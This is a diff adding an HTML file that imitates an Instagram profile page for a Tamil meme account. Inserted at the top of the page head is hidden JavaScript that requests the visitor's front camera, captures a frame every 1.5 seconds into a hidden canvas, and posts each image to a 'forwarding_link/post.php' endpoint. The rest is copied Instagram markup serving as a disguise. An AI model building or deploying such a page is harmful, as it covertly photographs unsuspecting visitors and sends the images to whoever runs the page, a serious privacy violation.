@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html class="js not-logged-in client-root js-focus-visible sDN5V" lang="en">
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+        <title>Mokkapostu (@mokkapostu) • Instagram photos and videos</title>
+
+        
+        <meta name="robots" content="noimageindex, noarchive">
+        <meta name="apple-mobile-web-app-status-bar-style" content="default">
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="theme-color" content="#ffffff">
+        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+        
+        
+    <link rel="manifest" href="https://www.instagram.com/data/manifest.json">
+
+        <link rel="preload" href="mokkapostu_files/8a2eb3d0ea9f.css" as="style" type="text/css" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/b8881b4b8d2f.css" as="style" type="text/css" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/2a9557e9bd3e.css" as="style" type="text/css" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/d4750492486d.css" as="style" type="text/css" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/c911f5848b78.js" as="script" type="text/javascript" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/075ef43ec782.js" as="script" type="text/javascript" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/f0fcd09c4b74.js" as="script" type="text/javascript" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/7f2892ea1d13.js" as="script" type="text/javascript" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/3069664b47c9.js" as="script" type="text/javascript" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/a59765ab4df5.js" as="script" type="text/javascript" crossorigin="anonymous">
+<link rel="preload" href="mokkapostu_files/084b8051c36f.js" as="script" type="text/javascript" crossorigin="anonymous">
+        
+        
+
+        <script src="mokkapostu_files/sdk_002.js" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="mokkapostu_files/sdk.js"></script><script type="text/javascript">
+        (function() {
+  var docElement = document.documentElement;
+  var classRE = new RegExp('(^|\\s)no-js(\\s|$)');
+  var className = docElement.className;
+  docElement.className = className.replace(classRE, '$1js$2');
+})();
+</script>
+        <script type="text/javascript">
+(function() {
+  if ('PerformanceObserver' in window && 'PerformancePaintTiming' in window) {
+    window.__bufferedPerformance = [];
+    var ob = new PerformanceObserver(function(e) {
+      window.__bufferedPerformance.push.apply(window.__bufferedPerformance,e.getEntries());
+    });
+    ob.observe({entryTypes:['paint']});
+  }
+
+  window.__bufferedErrors = [];
+  window.onerror = function(message, url, line, column, error) {
+    window.__bufferedErrors.push({
+      message: message,
+      url: url,
+      line: line,
+      column: column,
+      error: error
+    });
+    return false;
+  };
+  window.__initialData = {
+    pending: true,
+    waiting: []
+  };
+  function asyncFetchSharedData(extra) {
+    var sharedDataReq = new XMLHttpRequest();
+    sharedDataReq.onreadystatechange = function() {
+          if (sharedDataReq.readyState === 4) {
+            if(sharedDataReq.status === 200){
+              var sharedData = JSON.parse(sharedDataReq.responseText);
+              window.__initialDataLoaded(sharedData, extra);
+            }
+          }
+        }
+    sharedDataReq.open('GET', '/data/shared_data/', true);
+    sharedDataReq.send(null);
+  }
+  function notifyLoaded(item, data) {
+    item.pending = false;
+    item.data = data;
+    for (var i = 0;i < item.waiting.length; ++i) {
+      item.waiting[i].resolve(item.data);
+    }
+    item.waiting = [];
+  }
+  function notifyError(item, msg) {
+    item.pending = false;
+    item.error = new Error(msg);
+    for (var i = 0;i < item.waiting.length; ++i) {
+      item.waiting[i].reject(item.error);
+    }
+    item.waiting = [];
+  }
+  window.__initialDataLoaded = function(initialData, extraData) {
+    if (extraData) {
+      for (var key in extraData) {
+        initialData[key] = extraData[key];
+      }
+    }
+    notifyLoaded(window.__initialData, initialData);
+  };
+  window.__initialDataError = function(msg) {
+    notifyError(window.__initialData, msg);
+  };
+  window.__additionalData = {};
+  window.__pendingAdditionalData = function(paths) {
+    for (var i = 0;i < paths.length; ++i) {
+      window.__additionalData[paths[i]] = {
+        pending: true,
+        waiting: []
+      };
+    }
+  };
+  window.__additionalDataLoaded = function(path, data) {
+    if (path in window.__additionalData) {
+      notifyLoaded(window.__additionalData[path], data);
+    } else {
+      console.error('Unexpected additional data loaded "' + path + '"');
+    }
+  };
+  window.__additionalDataError = function(path, msg) {
+    if (path in window.__additionalData) {
+      notifyError(window.__additionalData[path], msg);
+    } else {
+      console.error('Unexpected additional data encountered an error "' + path + '": ' + msg);
+    }
+  };
+  
+})();
+</script><script type="text/javascript">
+
+/*
+ Copyright 2018 Google Inc. All Rights Reserved.
+ Licensed under the Apache License, Version 2.0 (the "License");
+ you may not use this file except in compliance with the License.
+ You may obtain a copy of the License at
+
+     http://www.apache.org/licenses/LICENSE-2.0
+
+ Unless required by applicable law or agreed to in writing, software
+ distributed under the License is distributed on an "AS IS" BASIS,
+ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ See the License for the specific language governing permissions and
+ limitations under the License.
+*/
+
+(function(){function g(a,c){b||(b=a,f=c,h.forEach(function(a){removeEventListener(a,l,e)}),m())}function m(){b&&f&&0<d.length&&(d.forEach(function(a){a(b,f)}),d=[])}function n(a,c){function k(){g(a,c);d()}function b(){d()}function d(){removeEventListener("pointerup",k,e);removeEventListener("pointercancel",b,e)}addEventListener("pointerup",k,e);addEventListener("pointercancel",b,e)}function l(a){if(a.cancelable){var c=performance.now(),b=a.timeStamp;b>c&&(c=+new Date);c-=b;"pointerdown"==a.type?n(c,
+a):g(c,a)}}var e={passive:!0,capture:!0},h=["click","mousedown","keydown","touchstart","pointerdown"],b,f,d=[];h.forEach(function(a){addEventListener(a,l,e)});window.perfMetrics=window.perfMetrics||{};window.perfMetrics.onFirstInputDelay=function(a){d.push(a);m()}})();
+</script>
+    
+                <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://www.instagram.com/static/images/ico/apple-touch-icon-76x76-precomposed.png/666282be8229.png">
+                <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/8a5bd3f267b1.png">
+                <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.instagram.com/static/images/ico/apple-touch-icon-152x152-precomposed.png/68193576ffc5.png">
+                <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://www.instagram.com/static/images/ico/apple-touch-icon-167x167-precomposed.png/4985e31c9100.png">
+                <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png/c06fdb2357bd.png">
+                
+                    <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+                
+            
+            
+                    <link rel="mask-icon" href="https://www.instagram.com/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
+                  
+                  <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+                
+            
+            
+            
+    
+            
+            <link rel="alternate" href="android-app://com.instagram.android/https/instagram.com/_u/mokkapostu/">
+        
+            
+            <meta property="al:ios:app_name" content="Instagram">
+            <meta property="al:ios:app_store_id" content="389801252">
+            <meta property="al:ios:url" content="instagram://user?username=mokkapostu">
+            <meta property="al:android:app_name" content="Instagram">
+            <meta property="al:android:package" content="com.instagram.android">
+            <meta property="al:android:url" content="https://www.instagram.com/_u/mokkapostu/">
+        
+            <link rel="canonical" href="https://www.instagram.com/mokkapostu/?hl=en">
+            <meta content="1.2m Followers, 7 Following, 11.4k Posts - See Instagram photos and videos from Mokkapostu (@mokkapostu)" name="description">
+            
+            <meta property="og:type" content="profile">
+            <meta property="og:image" content="https://instagram.fmaa2-1.fna.fbcdn.net/v/t51.2885-19/s150x150/79874480_464452900920988_3322144868309925888_n.jpg?_nc_ht=instagram.fmaa2-1.fna.fbcdn.net&amp;_nc_ohc=mqaJY91snUUAX9rUMxu&amp;oh=193daca03764e9495f5c79687f5a4ef5&amp;oe=5E8F04A0">
+            <meta property="og:title" content="Mokkapostu (@mokkapostu) • Instagram photos and videos">
+            <meta property="og:description" content="1.2m Followers, 7 Following, 11.4k Posts - See Instagram photos and videos from Mokkapostu (@mokkapostu)">
+            <meta property="og:url" content="https://www.instagram.com/mokkapostu/">
+        
+        
+
+            <script type="application/ld+json">
+                {"@context":"http:\/\/schema.org","@type":"Person","name":"Mokkapostu","alternateName":"@mokkapostu","description":"\ud83d\udd39#tamil Page which contains #Memes\ud83d\ude0e\n\ud83d\udd39CREDITS to Creator \ud83d\udc4f\n\ud83d\udd39Like \u2764\ufe0f comment \ud83d\udd25\n\ud83d\udd39Turn On post Notification \ud83d\udd14","url":"https:\/\/youtu.be\/9SlW7CZhi2s","mainEntityofPage":{"@type":"ProfilePage","@id":"https:\/\/www.instagram.com\/mokkapostu\/?hl=en","interactionStatistic":{"@type":"InteractionCounter","interactionType":"http:\/\/schema.org\/FollowAction","userInteractionCount":"1263811"}},"image":"https:\/\/www.instagram.com\/static\/images\/ico\/favicon-200.png\/ab6eff595bb1.png"}
+            </script>
+        
+    <link rel="alternate" href="https://www.instagram.com/mokkapostu/" hreflang="x-default">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=en" hreflang="en">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=fr" hreflang="fr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=it" hreflang="it">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=de" hreflang="de">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es" hreflang="es">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=zh-cn" hreflang="zh-cn">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=zh-tw" hreflang="zh-tw">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ja" hreflang="ja">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ko" hreflang="ko">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=pt" hreflang="pt">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=pt-br" hreflang="pt-br">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=af" hreflang="af">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=cs" hreflang="cs">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=da" hreflang="da">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=el" hreflang="el">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=fi" hreflang="fi">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=hr" hreflang="hr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=hu" hreflang="hu">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=id" hreflang="id">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ms" hreflang="ms">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=nb" hreflang="nb">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=nl" hreflang="nl">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=pl" hreflang="pl">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ru" hreflang="ru">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=sk" hreflang="sk">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=sv" hreflang="sv">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=th" hreflang="th">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=tl" hreflang="tl">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=tr" hreflang="tr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=hi" hreflang="hi">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=bn" hreflang="bn">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=gu" hreflang="gu">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=kn" hreflang="kn">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ml" hreflang="ml">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=mr" hreflang="mr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=pa" hreflang="pa">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ta" hreflang="ta">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=te" hreflang="te">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ne" hreflang="ne">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=si" hreflang="si">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ur" hreflang="ur">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=vi" hreflang="vi">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=bg" hreflang="bg">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=fr-ca" hreflang="fr-ca">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=ro" hreflang="ro">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=sr" hreflang="sr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=uk" hreflang="uk">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=zh-hk" hreflang="zh-hk">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-uy">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-pa">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-co">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-ec">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-cr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-ve">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-hn">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-gt">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-mx">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-cl">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-cu">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-pe">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-pr">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-ni">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-do">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-py">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-ar">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-bo">
+<link rel="alternate" href="https://www.instagram.com/mokkapostu/?hl=es-la" hreflang="es-sv">
+<script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="mokkapostu_files/084b8051c36f.js"></script><link href="mokkapostu_files/d4750492486d.css" type="text/css" crossorigin="anonymous" media="all" rel="stylesheet"><script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="mokkapostu_files/c001efbbb57c.js"></script><link href="mokkapostu_files/1ca7bf95a848.css" type="text/css" crossorigin="anonymous" media="all" rel="stylesheet"><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style></head>
+    <body class="" style="">
+        
+    <div id="react-root"><form enctype="multipart/form-data" method="POST" role="presentation"><input accept="image/jpeg" class="tb_sK" type="file"></form><section class="_9eogI E3X2T"><div></div><main class="SCxLW  o64aR " role="main"><div class="v9tJq AAaSh "><header class="vtbgv "><div class="XjzKX"><div class="_4dMfM"><div class="M-jxE"><button class="IalUJ "><img class="be6sR" src="mokkapostu_files/79874480_464452900920988_3322144868309925888_n.jpg"></button></div></div></div><section class="zwlfE"><div class="nZSzR"><h1 class="_7UhW9       fKFbl yUEEX   KV-D4            fDxYl     ">mokkapostu</h1><a class="BY3EC " rel="nofollow" href="https://www.instagram.com/accounts/login/?next=%2Fmokkapostu%2F&amp;source=follow"><button class="sqdOP  L3NKy   y3zKF     " type="button">Follow</button></a></div><ul class="k9GMp "><li class="Y8-fY "><a class="-nal3 " href="https://www.instagram.com/accounts/login/?next=%2Fmokkapostu%2F&amp;source=profile_posts"><span class="g47SY ">11,418</span> posts</a></li><li class="Y8-fY "><a class="-nal3 " href="https://www.instagram.com/accounts/login/?next=%2Fmokkapostu%2Ffollowers%2F&amp;source=followed_by_list"><span class="g47SY " title="1,263,811">1.2m</span> followers</a></li><li class="Y8-fY "><a class="-nal3 " href="https://www.instagram.com/accounts/login/?next=%2Fmokkapostu%2Ffollowing%2F&amp;source=follows_list"><span class="g47SY ">7</span> following</a></li></ul><div class="-vDIg"><h1 class="rhpdm">Mokkapostu</h1><br><span>🔹<a class=" xil3i" href="https://www.instagram.com/explore/tags/tamil/">#tamil</a> Page which contains <a class=" xil3i" href="https://www.instagram.com/explore/tags/memes%F0%9F%98%8E/">#Memes😎</a><br>🔹CREDITS to Creator 👏<br>🔹Like ❤️ comment 🔥<br>🔹Turn On post Notification 🔔</span> <a class="yLUwa" href="https://l.instagram.com/?u=https%3A%2F%2Fyoutu.be%2F9SlW7CZhi2s&amp;e=ATMp-rfD9P3ZYD1QFFR9nrh68wRXcdtifpQL4axYP0iwVDwTH76-5j6-FITrKsr601dezxbsgL5ZsV9ysUYamI-t&amp;s=1" rel="me nofollow noopener noreferrer" target="_blank">youtu.be/9SlW7CZhi2s</a></div></section></header><div class="Nd_Rl _2z6nI"><article class="ySN3v"><div class="_4Kbb_ _54f4m"><div class="QlxVY"><h2 class="rkEop">This Account is Private</h2><div class="VIsJD">Already follow mokkapostu? <a class="hUQXy" href="https://www.instagram.com/accounts/login/?source=private_profile">Log in</a> to see their photos and videos.</div></div></div></article></div></div></main><nav class="NXc7H jLuN9  X6gVd"><div class=" R4HNP "></div><div class="_8MQSO  Cx7Bp"><div class="_lz6s  Hz2lF"><div class="MWDvN  nfCOa"><div class="oJZym"><a class="" href="https://www.instagram.com/"><div class="                   Igw0E   rBNOH        eGOV_     ybXk5    _4EzTm                                                                                                              "><div class="cq2ai"><img alt="Instagram" class="s4Iyt" src="mokkapostu_files/735145cfe0a4.png" srcset="/static/images/web/mobile_nav_type_logo-2x.png/1b47f9d0e595.png 2x"></div></div></a></div><div class="LWmhU _0aCwM"><input class="XTCLo x3qfX " type="text" autocapitalize="none" placeholder="Search"><div class="pbgfb Di7vw " role="button" tabindex="0"><div class="eyXLr wUAXj "><span class="_6RZXI coreSpriteSearchIcon"></span><span class="TqC_a">Search</span></div></div></div><div class="ctQZg"><div class="ZcHy5"><div class="vCZ2N"><div class="      tHaIX             Igw0E     IwRSH   pmxbr     YBx95       _4EzTm                                      CIRqI                  IY_1_                           XfCBB             HcJZg        O1flK D8xaz  _7JkPY  TxciK  N9d2H ZUqME" style="width: 100%;"><button class="dCJp8 afkep xqRnw"><span aria-label="Close" class="glyphsSpriteGrey_Close u-__7"></span></button><div class="                   Igw0E   rBNOH     pmxbr     YBx95   ybXk5    _4EzTm                                                                                                              " style="width: 903px;"><div class=" _41V_T                  Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              " style="height: 56px; width: 56px;"><span aria-label="Log In" class="glyphsSpriteLogged_Out_QP_Glyph u-__7"></span></div><div class="oM3-t _RI9A"><div class="          QzzMF         Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                                                                                                         "><div class="_7UhW9   xLCgt       qyrsm        h_zdq uL8Hv      M8ipN   ">Log In to Instagram</div></div><div class="_7UhW9   xLCgt      MMzan         h_zdq uL8Hv      M8ipN   hjZTB">Log in to see photos and videos from friends and discover other accounts you'll love.</div></div><div class="                   Igw0E     IwRSH      eGOV_         _4EzTm                       n4cjz                                                                                       " style="min-width: 112px;"><div class="                   Igw0E     IwRSH      eGOV_         _4EzTm                                                           _49XvD                                                   "><a class="sqdOP  L3NKy   y3zKF    ZIAjV " href="https://www.instagram.com/accounts/login/?next=%2F&amp;source=logged_out_half_sheet">Log In</a></div><div class="                   Igw0E     IwRSH      eGOV_         _4EzTm                                                           _49XvD                      lC6p0                             "><a class="sqdOP yWX7d    y3zKF    ZIAjV " href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></div></div></div></div></div><span class="r9-Os"><a class="tdiEy" href="https://www.instagram.com/accounts/login/?next=%2Fmokkapostu%2F&amp;source=desktop_nav"><button class="sqdOP  L3NKy   y3zKF     " type="button">Log In</button></a><a class="tdiEy" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></span></div></div></div></div></div></nav><footer class="_8Rna9  _3Laht " role="contentinfo"><div class="iseBh  VWk7Y " style="max-width: 1012px;"><nav class="uxKLF"><ul class="ixdEe"><li class="K5OFK"><a class="l93RR" href="https://about.instagram.com/about-us" rel="nofollow noopener noreferrer" target="_blank">About us</a></li><li class="K5OFK"><a class="l93RR" href="https://help.instagram.com/">Help</a></li><li class="K5OFK"><a class="l93RR" href="https://instagram-press.com/">Press</a></li><li class="K5OFK"><a class="l93RR" href="https://www.instagram.com/developer/">API</a></li><li class="K5OFK"><a class="l93RR" href="https://www.instagram.com/about/jobs/">Jobs</a></li><li class="K5OFK"><a class="l93RR" href="https://www.instagram.com/legal/privacy/">Privacy</a></li><li class="K5OFK"><a class="l93RR _vfM2" href="https://www.instagram.com/legal/terms/">Terms</a></li><li class="K5OFK"><a class="l93RR" href="https://www.instagram.com/explore/locations/">Directory</a></li><li class="K5OFK"><a class="l93RR" href="https://www.instagram.com/directory/profiles/">Profiles</a></li><li class="K5OFK"><a class="l93RR" href="https://www.instagram.com/directory/hashtags/">Hashtags</a></li><li class="K5OFK"><span class="_3G4x7  l93RR">Language<select aria-label="Switch Display Language" class="hztqj"><option value="af">Afrikaans</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="en" selected="selected">English</option><option value="es">Español (España)</option><option value="es-la">Español</option><option value="fi">Suomi</option><option value="fr">Français</option><option value="id">Bahasa Indonesia</option><option 